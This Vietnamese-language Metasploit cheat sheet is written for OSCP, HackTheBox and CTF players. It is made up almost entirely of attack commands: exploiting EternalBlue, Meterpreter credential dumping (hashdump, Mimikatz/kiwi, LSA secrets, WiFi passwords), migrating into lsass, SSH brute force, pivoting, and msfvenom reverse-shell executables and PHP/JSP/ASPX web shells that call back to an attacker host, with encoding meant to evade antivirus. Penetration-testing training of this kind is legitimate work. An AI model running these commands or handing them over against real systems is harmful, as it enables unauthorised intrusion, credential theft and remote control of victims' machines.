# 🟥 Metasploit Framework Cheat Sheet

> Dành cho Pentesters & CTF Players — theo phong cách IppSec / OSCP / HackTheBox

---

## 📦 Khởi động & Cơ sở dữ liệu

```bash
# Khởi động PostgreSQL (bắt buộc để lưu workspace/loot)
sudo systemctl start postgresql

# Khởi động msfconsole
msfconsole
msfconsole -q          # Không hiện banner (gọn hơn, hay dùng)
msfconsole -x "command" # Chạy lệnh rồi vào console

# Khởi tạo database lần đầu
msfdb init
msfdb start

# Kiểm tra kết nối DB trong msfconsole
msf> db_status
```

---

## 🗂 Workspace (Quản lý project — chuẩn OSCP)

```bash
# Liệt kê workspace
msf> workspace

# Tạo workspace mới cho từng target/machine
msf> workspace -a hackthebox_forest
msf> workspace -a oscp_lab_10.10.10.x

# Chuyển workspace
msf> workspace hackthebox_forest

# Xóa workspace
msf> workspace -d hackthebox_forest
```

---

## 🔎 Tìm kiếm Module

```bash
# Tìm theo tên
msf> search eternalblue
msf> search vsftpd

# Tìm theo CVE
msf> search cve:2021-41773
msf> search cve:2017-0144

# Tìm theo platform + type
msf> search platform:windows type:exploit smb
msf> search platform:linux type:local privilege

# Tìm theo rank (excellent > great > good)
msf> search rank:excellent type:exploit apache

# Kết hợp nhiều filter
msf> search type:exploit platform:windows port:445 target:XP
```

---

## 📋 Thông tin Module

```bash
# Xem thông tin đầy đủ (options, targets, references)
msf> info exploit/windows/smb/ms17_010_eternalblue

# Xem options sau khi use
msf> show options

# Xem targets được hỗ trợ
msf> show targets

# Xem payloads tương thích
msf> show payloads

# Xem advanced options (evasion, timeout...)
msf> show advanced

# Xem encoders
msf> show encoders
```

---

## ⚡ Workflow cơ bản (OSCP / HTB style)

```bash
# 1. Chọn module
msf> use exploit/windows/smb/ms17_010_eternalblue
# Hoặc dùng số từ kết quả search
msf> use 0

# 2. Set target
msf> set RHOSTS 10.10.10.40
msf> set RPORT 445          # thường tự set theo module

# 3. Set payload
msf> set payload windows/x64/meterpreter/reverse_tcp

# 4. Set local listener
msf> set LHOST 10.10.14.x   # IP của bạn (tun0 khi dùng VPN HTB/OSCP)
msf> set LPORT 4444

# 5. Kiểm tra lại
msf> show options

# 6. Check target có vulnerable không (nếu module có)
msf> check

# 7. Chạy
msf> run
# hoặc
msf> exploit

# Run ngầm (background) — dùng khi muốn giữ session
msf> exploit -j
```

---

## 🎯 Set Options Nâng cao

```bash
# Set nhiều host (scan cả subnet)
msf> set RHOSTS 10.10.10.0/24
msf> set RHOSTS 10.10.10.1-50
msf> set RHOSTS file:/tmp/hosts.txt

# Set threads (tăng tốc scan)
msf> set THREADS 10

# Set timeout
msf> set ConnectTimeout 10

# Unset option
msf> unset LHOST

# Unset tất cả
msf> unset all

# Set global (áp dụng cho mọi module trong session)
msf> setg LHOST 10.10.14.x
msf> setg LPORT 4444

# Unset global
msf> unsetg LHOST
```

---

## 🐚 Meterpreter — Lệnh hay dùng nhất

### Thông tin hệ thống

```bash
meterpreter> sysinfo          # OS, hostname, architecture
meterpreter> getuid           # User hiện tại
meterpreter> getpid           # PID của process hiện tại
meterpreter> ps               # Liệt kê processes
meterpreter> ifconfig         # Network interfaces
meterpreter> ipconfig         # Windows style
meterpreter> arp              # ARP table (pivot target)
meterpreter> netstat          # Connections
meterpreter> route            # Routing table
```

### File System

```bash
meterpreter> pwd              # Thư mục hiện tại
meterpreter> ls               # Liệt kê file
meterpreter> cd C:\\Users     # Di chuyển thư mục
meterpreter> cat file.txt     # Đọc file
meterpreter> download file.txt /tmp/   # Download file về máy
meterpreter> upload /tmp/tool.exe C:\\Windows\\Temp\\  # Upload file
meterpreter> search -f *.txt -d C:\\Users  # Tìm file
meterpreter> search -f "*.kdbx"            # Tìm KeePass database
meterpreter> edit file.txt    # Mở editor
meterpreter> rm file.txt      # Xóa file
```

### Privilege Escalation

```bash
meterpreter> getuid           # Kiểm tra quyền hiện tại
meterpreter> getsystem        # Auto PrivEsc (Windows) — thử nhiều kỹ thuật
meterpreter> getsystem -t 1   # Chỉ dùng technique 1 (Named Pipe)

# Migrate sang process quyền cao hơn
meterpreter> ps               # Tìm process của SYSTEM (lsass, winlogon...)
meterpreter> migrate 668      # Migrate vào PID 668 (ví dụ: lsass.exe)
meterpreter> migrate -N lsass.exe  # Migrate theo tên

# Local exploit suggester (hay dùng sau khi có shell)
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION 1
msf> run
```

### Credential Dumping

```bash
# Hashdump (cần SYSTEM hoặc admin)
meterpreter> hashdump

# Kiwi (Mimikatz tích hợp) — cần migrate vào x64 process trước
meterpreter> load kiwi
meterpreter> creds_all         # Dump tất cả credentials
meterpreter> lsa_dump_sam      # SAM database
meterpreter> lsa_dump_secrets  # LSA secrets
meterpreter> wifi_list         # Saved WiFi passwords
```

### Shell & Pivot

```bash
# Mở shell thường từ meterpreter
meterpreter> shell

# Thoát shell về meterpreter
CTRL+Z hoặc exit

# Background session
meterpreter> background
# hoặc
CTRL+Z

# Port forward (pivot)
meterpreter> portfwd add -l 3389 -p 3389 -r 172.16.1.10
# → Sau đó RDP vào 127.0.0.1:3389

# SOCKS proxy để route qua meterpreter
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run -j
# → Cấu hình proxychains để dùng
```

---

## 📡 Sessions Management

```bash
# Liệt kê sessions
msf> sessions
msf> sessions -l              # Verbose

# Vào session
msf> sessions -i 1            # Vào session ID 1

# Background session (từ meterpreter)
meterpreter> background

# Kill session
msf> sessions -k 1
msf> sessions -K              # Kill tất cả

# Upgrade shell thường lên meterpreter
msf> sessions -u 1

# Chạy lệnh trên session không cần vào
msf> sessions -c "getuid" -i 1
```

---

## 🔍 Auxiliary Modules (Scan & Enum)

```bash
# Port scan
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 10.10.10.0/24
msf> set PORTS 22,80,443,445,3389
msf> run

# SMB Enum (rất dùng trong CTF/OSCP)
msf> use auxiliary/scanner/smb/smb_version
msf> use auxiliary/scanner/smb/smb_enumshares
msf> use auxiliary/scanner/smb/smb_enumusers
msf> use auxiliary/scanner/smb/smb_ms17_010    # Check EternalBlue

# SSH
msf> use auxiliary/scanner/ssh/ssh_version
msf> use auxiliary/scanner/ssh/ssh_login       # Brute force

# HTTP
msf> use auxiliary/scanner/http/http_version
msf> use auxiliary/scanner/http/dir_scanner    # Directory brute

# FTP
msf> use auxiliary/scanner/ftp/ftp_version
msf> use auxiliary/scanner/ftp/anonymous       # Check anon login

# RDP
msf> use auxiliary/scanner/rdp/rdp_scanner
msf> use auxiliary/scanner/rdp/ms12_020_check  # BlueScreen vuln

# SNMP
msf> use auxiliary/scanner/snmp/snmp_enum

# Credential bruteforce (generic)
msf> use auxiliary/scanner/ssh/ssh_login
msf> set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf> set STOP_ON_SUCCESS true
```

---

## 🎭 Payload Generation (msfvenom)

> `msfvenom` dùng độc lập ngoài `msfconsole`

```bash
# Windows reverse shell exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -f exe -o shell.exe

# Linux reverse shell elf
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -f elf -o shell.elf

# Web shells
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -f raw -o shell.php

msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -f raw -o shell.jsp

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -f aspx -o shell.aspx

# Staged vs Stageless
# Staged (nhỏ, cần kết nối về MSF để load payload):
windows/x64/meterpreter/reverse_tcp     # dấu / = staged

# Stageless (lớn hơn, tự chứa payload, không cần MSF listener đặc biệt):
windows/x64/meterpreter_reverse_tcp     # dấu _ = stageless

# Encode để bypass AV (cơ bản — không đủ với AV hiện đại)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.x LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o shell_encoded.exe

# Liệt kê tất cả payloads
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep "linux/x64"

# Liệt kê formats
msfvenom -l formats
```

---

## 🎧 Handler (Listener thủ công)

```bash
# Khi dùng msfvenom bên ngoài, cần handler để bắt kết nối
msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.10.14.x
msf> set LPORT 4444
msf> set ExitOnSession false   # Tiếp tục lắng nghe sau khi có session
msf> exploit -j                # Run background để bắt nhiều session
```

---

## 🗄 Database & Loot

```bash
# Import Nmap scan vào DB
msf> db_nmap -sV -sC -oA scan 10.10.10.x
# Hoặc import file có sẵn
msf> db_import scan.xml

# Xem hosts đã phát hiện
msf> hosts
msf> hosts -c address,os_name,purpose

# Xem services
msf> services
msf> services -p 445          # Filter theo port
msf> services -s smb          # Filter theo tên

# Xem vulnerabilities
msf> vulns

# Xem credentials đã thu thập
msf> creds
msf> creds -u administrator   # Filter theo user

# Xem loot (files đã lấy được)
msf> loot

# Xem notes
msf> notes
```

---

## 🔄 Post-Exploitation Modules

```bash
# Sau khi có session, dùng post modules
msf> use post/windows/gather/hashdump
msf> use post/windows/gather/enum_shares
msf> use post/windows/gather/enum_applications
msf> use post/windows/gather/credentials/credential_collector
msf> use post/windows/manage/enable_rdp      # Bật RDP

# Linux
msf> use post/linux/gather/hashdump
msf> use post/linux/gather/enum_configs
msf> use post/linux/gather/enum_network

# Multi platform
msf> use post/multi/recon/local_exploit_suggester  # PrivEsc suggester
msf> use post/multi/gather/env                     # Environment variables
msf> use post/multi/manage/shell_to_meterpreter    # Upgrade shell

# Set session và chạy
msf> set SESSION 1
msf> run
```

---

## 🌐 Pivoting & Routing

```bash
# Thêm route qua session (để reach internal network)
msf> route add 172.16.1.0/24 1    # 1 = session ID
msf> route print
msf> route remove 172.16.1.0/24 1

# Auto route (dễ hơn)
msf> use post/multi/manage/autoroute
msf> set SESSION 1
msf> run

# SOCKS proxy để dùng với proxychains
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run -j

# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Sau đó:
proxychains nmap -sT -Pn 172.16.1.10
proxychains curl http://172.16.1.10
```

---

## 💡 Tips & Tricks từ CTF / OSCP Community

```bash
# 1. Reload module list (sau khi thêm custom module)
msf> reload_all

# 2. Lưu global settings vào file
msf> save
# → Tự động load lại lần sau

# 3. Dùng resource script để automate
msf> resource /tmp/setup.rc
# File setup.rc:
# use exploit/multi/handler
# set payload windows/x64/meterpreter/reverse_tcp
# set LHOST 10.10.14.x
# set LPORT 4444
# exploit -j

# 4. History command
msf> history

# 5. Redirect output ra file
msf> spool /tmp/msf_output.txt
msf> spool off

# 6. Verbose mode khi exploit thất bại
msf> set verbose true
msf> set LogLevel 5

# 7. Check module rank trước khi chọn
# excellent > great > good > normal > average > low > manual
# Ưu tiên excellent/great cho OSCP (ít crash target hơn)

# 8. Dùng 'grep' trong msfconsole
msf> grep meterpreter show payloads
msf> grep windows/x64 show payloads

# 9. Tab completion — luôn dùng Tab để xem options
msf> set payload <Tab>
msf> use exploit/windows/<Tab>

# 10. Kiểm tra LHOST khi dùng VPN
ip addr show tun0   # Lấy IP interface tun0
# Sau đó setg LHOST <ip đó>
```

---

## ⚠️ Lưu ý quan trọng

- **OSCP**: Metasploit bị giới hạn — chỉ được dùng **1 lần** trong toàn bộ exam cho **1 target**. Luyện khai thác manual song song
- **`set ExitOnSession false`** — luôn set khi chạy handler, tránh mất listener sau session đầu
- **Migrate process** trước khi làm gì nặng — shell meterpreter dễ bị kill nếu process gốc chết
- **Staged payload** cần MSF listener; **stageless** có thể bắt bằng `nc` nhưng không có meterpreter features
- **`getsystem` thất bại** → thử local_exploit_suggester thay vì brute-force thủ công
- **`db_nmap`** thay vì `nmap` riêng — kết quả tự vào DB, dùng được với `hosts`/`services`

---

## 🔗 Tài nguyên tham khảo

> _(Chỉ liệt kê nguồn đã verify)_

- **Metasploit Documentation chính thức**: https://docs.metasploit.com
- **Metasploit Unleashed (OffSec)**: https://www.offsec.com/metasploit-unleashed/
- **IppSec YouTube**: https://www.youtube.com/@ippsec
- **HackTricks — Metasploit**: https://book.hacktricks.wiki/en/generic-hacking/metasploit-for-pentesting.html
- **Rapid7 Blog**: https://www.rapid7.com/blog/

---

_Cheat sheet tổng hợp từ kinh nghiệm OSCP, HackTheBox, CTF community — không phải tài liệu chính thức._